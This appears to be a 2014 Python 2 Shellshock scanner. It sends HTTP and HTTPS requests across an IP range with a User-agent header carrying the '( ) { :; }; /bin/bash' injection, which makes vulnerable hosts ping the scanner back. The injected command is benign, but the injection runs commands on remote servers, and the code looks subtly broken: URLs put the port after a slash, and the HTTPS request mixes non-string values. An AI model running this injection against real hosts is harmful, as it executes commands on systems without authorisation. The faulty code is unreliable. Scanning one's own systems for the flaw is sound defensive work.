#!/usr/bin/python
#Python Shellshock User-agent Scanner
#
#Shad Malloy
#shad.malloy@securenetworkmanagement.com
#
#Version 1.0
#
#10/8/2014
#
#
#Imports
from threading import Thread
from netaddr import *
import signal
import datetime
import getopt
import time
import sys
import random
import os
import socket
import urllib2

#Globals
resultsList=[]
threadCounter = 0
listenerFlag = True
localHost = '127.0.0.1'

#CTRL+C Handler
def customExit(signum, frame):
    #restore the original because that is what I read to prevent problems
    signal.signal(signal.SIGINT, originalSigint)
    
    #Write out any results and exit
    print "\n.xX Scan Cancelled By User Xx.\n"
    
    #End message
    print 'Scan Cancelled at ' + datetime.datetime.now().strftime('%H:%M:%S')

    #exit
    sys.exit(1)
    
#Listener Function
def listenWorker():
    #Socket setup
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind(('', 1))
    
    #Start ICMP Listener
    #Use Global Listener Flag
    global listenerFlag
    while listenerFlag is True :
       #receive data
       data = sock.recv(1508)

       #ip header is the first 20 bytes
       ip_header = data[:20]

       #ip source address is 4 bytes and is second last field
       ips = ip_header[-8:-4]

       #convert to dotted decimal format
       source = '%i.%i.%i.%i' % (ord(ips[0]), ord(ips[1]), ord(ips[2]), ord(ips[3]))

       #Write to results list
       global resultsList
       resultsList.append(source)
    
#Worker Function
def scanWorker(ip,port):
    try:
        #Create Request and Set User-agent
        #HTTP requests
        threadReqHTTP = urllib2.Request('http://' + str(ip) + '/:' + str(port))
        global localHost
        threadReqHTTP.add_header('User-agent','( ) { :; }; /bin/bash "ping ' + str(localHost) + ' -c 5"')
        urllib2.urlopen(threadReqHTTP)
        
        #HTTPS requests
        threadReqHTTPS = urllib2.Request('https://' + ip + '/:' + port)
        threadReqHTTPS.add_header('User-agent','( ) { :; }; /bin/bash "ping ' + str(localHost) + ' -c 5"')
        urllib2.urlopen(threadReqHTTPS)
        
        #Update thread counter
        global threadCounter 
        threadCounter -= 1
    except:
        threadCounter -= 1
#Main
def main(argv):
    scanRange = '127.0.0.1/32'
    #Scan additional ports by adding then to scanPorts List
    scanPorts = [80,280,443,1080,3780,8000,8080,8443,8834]
    interfaceOpt = 'eth0'
    usage = 'usage shellshockUAScanner.py -r <CIDR range> -t <number of threads *default is 16> -i <interface *default is eth0>'
    threadMax = 16
   
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hr:t:i:",["help","scanRange=","threads=","interface="])
    except getopt.GetoptError:
        print usage

    for opt,arg in opts:
        if opt in ('-h', "--help"):
            print usage
            sys.exit()
        elif opt in ("-r", "--range"):
            scanRange = arg
        elif opt in ("-t", "--threads"):
            threadMax = arg
        elif opt in ("-i", "--interface"):
            interfaceOpt = arg
        else:
            assert False, "Option not recognized: try -h for usage"
            
    #Sanity Check for threadMax
    if IPNetwork(scanRange).size < threadMax:
        threadMax = IPNetwork(scanRange).size
    if threadMax > 256:
        threadMax = 255
        print 'Thread count set to 255'
            
    #create the randomized scan list
    ipList = list(IPNetwork(scanRange))
    random.shuffle(ipList)

    #Get local IP exit if 127.0.0.1
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.connect(('<broadcast>', 0))
    global localHost
    localHost = s.getsockname()[0]

    if str(localHost) == '127.0.0.1':
        print 'Unable to obtain local adress for ICMP listener ... exiting'
        sys.exit()

    #Start Listener as thread
    print 'Starting Listener'
    listener = Thread(target=listenWorker, args=())
    listener.start()
    #Wait for listener to start
    while listener.isAlive() is False:
            time.sleep(.2)
        
    
    #Start message
    print 'Starting URL Scan'
    
    #loop over port and ip
    for ip in list(ipList):
        for activePort in scanPorts:
            #While listener is running loop over addresses
            #update thread counter
            global threadCounter
            threadCounter += 1
            
            #wait if thread count is more than maximum thread count
            while int(threadCounter) > int(threadMax):
                time.sleep(.25)
                   
            #Do work
            else:
                #Actual Work
                worker = Thread(target=scanWorker, args=(ip,activePort,))
                worker.setDaemon(True)
                worker.start()

    #Pause to allow pings to return before continuing
    print 'Waiting for ICMP response from hosts'
    time.sleep(5)
    
    #Stop Listener
    global listenerFlag
    listenerFlag = False
    print 'Listener Stopped'
                    
    #Sort List
    uniqueList = []
    global resultsList
    for e in resultsList:
        if e not in uniqueList:
            uniqueList.append(e)
    uniqueList.sort()

    #End message and results
    print 'This tool does not detect the HTTP(S) port used to create the response.'
    print 'Test HTTP(S) on all ports scanned: ' + str(scanPorts).strip('[]')
    if len(uniqueList) == 0:
        print 'No scanned host responded'
        exit
    else:
        print 'Unique Hosts:\n'
        for i in uniqueList:
            print i
        exit    

# Main Thread
if __name__ == "__main__":
    #store original SIGINT handler
    originalSigint = signal.getsignal(signal.SIGINT)
    #use custom CTRL+C handler
    signal.signal(signal.SIGINT, customExit)
    #call main
    main(sys.argv[1:])
